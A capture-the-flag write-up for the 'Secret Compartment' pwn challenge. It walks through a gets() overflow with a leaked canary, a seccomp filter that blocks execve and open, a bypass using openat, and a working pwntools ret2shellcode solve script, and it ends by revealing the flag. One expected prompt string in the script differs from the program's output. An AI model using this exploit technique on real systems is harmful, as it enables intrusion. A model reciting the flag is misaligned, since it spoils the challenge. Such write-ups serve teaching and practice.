## \[pwn] Secret Compartment
> Expected Difficulty: 2

First, we decompile the binary to see what the program does. I will be using Ghidra, but feel free to use any decompiler you like (The code in this challenge is too simple that it doesn't really matter what decompiler you use, even online ones should work fine).

```c
undefined8 main(void)

{
  setup();
  fun();
  return 0;
}
```

A simple main function with a `setup` function and a `fun` function. 

`setup` function contains a large ~~(actually not quite)~~ amount of unreadable code, let's ignore them for now.

`fun` function is much simpler and have noticable vulnerabilities.

```c
void fun(void)

{
  long in_FS_OFFSET;
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("I have a compartment available for renting at %p, but I bet you cannot find my secret comp artment\n"
         ,local_98);
  puts("I can rent you some space to put things in this compartment though.");
  printf("You are lucky that I am making a limited time offer, just HKD %p for 0x88 bytes storage!\n "
         ,local_10);
  gets(local_98);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

The `gets` function is obviously vulnerable to buffer overflow, and the `local_10` variable directly gives us the canary value. It also leaks the address of `local_98`, which is the address of the buffer we can overflow.

We can further run `checksec` to see if there are any protections enabled. 

```sh
$ checksec service
[*] '[REDACTED]/service'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable
    RWX:      Has RWX segments
```
We can see that the stack is executable, so a standard ret2shellcode attack will work.

Simply overflow the buffer with shellcode (you have 0x88 bytes of space! More than enough!) and then overwrite the return address with the address of the buffer. The canary value is also leaked to you directly, so you can just use that to bypass the stack canary check.

Then you will somehow fail, miserably... Somehow you cannot get the shell in this challenge.

Recall that the `setup` function is unreadable, and we have no idea what it does, we can ~~magically~~ guess that it has something to do with protection.

Combining this idea with the challenge name, **SEC**ret **COMP**artment, we can know that the `setup` function is also doing some seccomp filtering setup. By running through `seccomp-tools`, we can get the following results:

```sh
$ seccomp-tools dump ./service
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

So, we can see that `execve` and `open` are both blocked. With a little bit of Googling, we can find that `openat` is not blocked, which can be used to bypass the seccomp filter.

We can then use `openat` to open the file, `read` it and then `write` it to stdout. Now you can get the flag.

> Q: Why I cannot get the flag by reading flag.txt?

Umm... Read the Dockerfile, maybe? That file is given to you for some reason...

> Q: What if I don't know about seccomp? This challenge is too hard!

~~You can try harder.~~ OK fine let's read the setup function together.

```c
undefined8 setup(void)

{
  int iVar1;
  int *piVar2;
  undefined8 uVar3;
  long in_FS_OFFSET;
  undefined2 local_78 [4];
  undefined2 *local_70;
  undefined2 local_68;
  undefined local_66;
  undefined local_65;
  undefined4 local_64;
  undefined2 local_60;
  undefined local_5e;
  undefined local_5d;
  undefined4 local_5c;
  undefined2 local_58;
  undefined local_56;
  undefined local_55;
  undefined4 local_54;
  undefined2 local_50;
  undefined local_4e;
  undefined local_4d;
  undefined4 local_4c;
  undefined2 local_48;
  undefined local_46;
  undefined local_45;
  undefined4 local_44;
  undefined2 local_40;
  undefined local_3e;
  undefined local_3d;
  undefined4 local_3c;
  undefined2 local_38;
  undefined local_36;
  undefined local_35;
  undefined4 local_34;
  undefined2 local_30;
  undefined local_2e;
  undefined local_2d;
  undefined4 local_2c;
  undefined2 local_28;
  undefined local_26;
  undefined local_25;
  undefined4 local_24;
  undefined2 local_20;
  undefined local_1e;
  undefined local_1d;
  undefined4 local_1c;
  undefined2 local_18;
  undefined local_16;
  undefined local_15;
  undefined4 local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_68 = 0x20;
  local_66 = 0;
  local_65 = 0;
  local_64 = 4;
  local_60 = 0x15;
  local_5e = 1;
  local_5d = 0;
  local_5c = 0xc000003e;
  local_58 = 6;
  local_56 = 0;
  local_55 = 0;
  local_54 = 0;
  local_50 = 0x20;
  local_4e = 0;
  local_4d = 0;
  local_4c = 0;
  local_48 = 0x35;
  local_46 = 0;
  local_45 = 1;
  local_44 = 0x40000000;
  local_40 = 6;
  local_3e = 0;
  local_3d = 0;
  local_3c = 0;
  local_38 = 0x15;
  local_36 = 0;
  local_35 = 1;
  local_34 = 0x3b;
  local_30 = 6;
  local_2e = 0;
  local_2d = 0;
  local_2c = 0;
  local_28 = 0x15;
  local_26 = 0;
  local_25 = 1;
  local_24 = 2;
  local_20 = 6;
  local_1e = 0;
  local_1d = 0;
  local_1c = 0;
  local_18 = 6;
  local_16 = 0;
  local_15 = 0;
  local_14 = 0x7fff0000;
  local_78[0] = 0xb;
  local_70 = &local_68;
  iVar1 = prctl(0x26,1,0,0,0);
  if (iVar1 == 0) {
    iVar1 = prctl(0x16,2,local_78);
    if (iVar1 == 0) {
      uVar3 = 0;
      goto LAB_00101423;
    }
    perror(":<");
  }
  else {
    perror(":c");
  }
  piVar2 = __errno_location();
  if (*piVar2 == 0x16) {
    puts(":(");
  }
  uVar3 = 1;
LAB_00101423:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
}
```

~~Why did I even paste this here...~~

There is a large pile of variable assignments. But let's focus on the part that is really performing some actions that could affect the `fun` function. That is, the function calls. setvbuf are simply setting the buffer for stdin, stdout and stderr, so we can ignore them. prctl is the interesting one.

Search for `prctl ctf` online and you will find out about `seccomp`. With the hint in the challenge name, we can guess that this is a seccomp filter setup.

If you didn't notice the `prctl` part then... ummm... I guess you really need to try harder.

Solve script:
```py
from pwn import *

with remote("localhost", 25039) as io: # Change accordingly
    io.recvuntil(b"I have an compartment at ")
    addr = int(io.recvuntil(b",", drop=True), 16)
    io.recvuntil(b"just HKD ")
    canary = int(io.recvuntil(b" ", drop=True),16)

    context.arch = 'amd64'
    shellcode = shellcraft.openat(0, '/app/compartment.txt', 0)
    shellcode += shellcraft.read(3,addr+0x100,0x200)
    shellcode += shellcraft.write(1,addr+0x100,0x200)
    shellcode = asm(shellcode)

    payload = flat(
        shellcode,
        b"A" * (0x88 - len(shellcode)),
        canary,
        b"\x00" * 8,
        addr
    )
    io.sendline(payload)
    io.interactive()
```

Flag: **`cuhk25ctf{Secr3t_C0mpu71ng_1n_S3cure_C0mpartm3n7}`**